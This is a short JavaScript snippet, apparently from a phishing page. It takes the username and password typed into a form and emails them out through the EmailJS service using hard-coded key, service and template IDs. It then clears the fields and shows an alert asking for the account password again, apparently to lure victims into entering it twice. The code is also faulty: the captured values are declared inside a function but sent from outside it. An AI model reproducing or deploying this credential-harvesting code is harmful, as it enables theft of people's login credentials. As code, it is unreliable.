var emailjs= emailjs.init("8ckODlN_JTZzfQzrz");  // Replace 'YOUR_PUBLIC_KEY' with your actual EmailJS public key

function sendmail() {
    var params = {
        Username: document.getElementById("username").value,  // 'username' matches the template
        Password: document.getElementById("password").value,  // 'password' matches the template
    };
}

const serviceID = "service_h6bh47m";
const templateID = "template_g26p39p";

emailjs.send("service_h6bh47m", "template_g26p39p", params)
.then(
    res =>{
        document.getElementById("username").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("Please Put your account password")
    })
    .catch((err) => console.log(err));